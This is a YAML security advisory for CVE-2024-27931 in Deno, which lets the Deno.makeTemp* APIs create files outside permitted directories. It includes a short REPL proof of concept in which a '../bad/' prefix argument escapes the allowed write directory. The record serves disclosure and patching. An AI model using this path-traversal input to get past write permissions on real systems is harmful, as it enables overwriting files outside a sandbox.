---
identifier: "CVE-2024-27931"
identifiers:
- "CVE-2024-27931"
- "GHSA-hrqr-jv8w-v9jh"
package_slug: "cargo/deno"
title: "Insufficient permission checking in `Deno.makeTemp*` APIs"
description: "Insufficient validation of parameters in `Deno.makeTemp*` APIs would
  allow for creation of files outside of the allowed directories. This may allow the
  user to overwrite important files on the system that may affect other systems.\n\nA
  user may provide a prefix or suffix to a `Deno.makeTemp*` API containing path traversal
  characters. The permission check would prompt for the base directory of the API,
  but the final file that was created would be outside of this directory:\n\n```\n$
  mkdir /tmp/good\n$ mkdir /tmp/bad\n$ deno repl --allow-write=/tmp/good\n> Deno.makeTempFileSync({
  dir: \"/tmp/bad\" })\n┌ ⚠️  Deno requests write access to \"/tmp/bad\".\n├ Requested
  by `Deno.makeTempFile()` API.\n├ Run again with --allow-write to bypass this prompt.\n└
  Allow? [y/n/A] (y = yes, allow; n = no, deny; A = allow all write permissions) >
  n\n❌ Denied write access to \"/tmp/bad\".\nUncaught PermissionDenied: Requires write
  access to \"/tmp/bad\", run again with the --allow-write flag\nat Object.makeTempFileSync
  (ext:deno_fs/30_fs.js:176:10)\nat <anonymous>:1:27\n> Deno.makeTempFileSync({ dir:
  \"/tmp/good\", prefix: \"../bad/\" })\n\"/tmp/good/../bad/a9432ef5\"\n$ ls -l /tmp/bad/a9432ef5\n-rw-------@
  1 user  group  0 Mar  4 09:20 /tmp/bad/a9432ef5\n```"
date: "2024-03-05"
pubdate: "2024-03-05"
affected_range: "<1.41.1"
fixed_versions:
- "1.41.1"
affected_versions: "All versions before 1.41.1"
not_impacted: "All versions starting from 1.41.1"
solution: "Upgrade to version 1.41.1 or above."
urls:
- "https://nvd.nist.gov/vuln/detail/CVE-2024-27931"
- "https://github.com/advisories/GHSA-hrqr-jv8w-v9jh"
- "https://github.com/denoland/deno/security/advisories/GHSA-hrqr-jv8w-v9jh"
- "https://github.com/denoland/deno"
cvss_v3: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N"
uuid: "31d8f964-942a-4e78-9f47-e7c5a013dbe0"
cwe_ids:
- "CWE-20"
- "CWE-937"
- "CWE-1035"
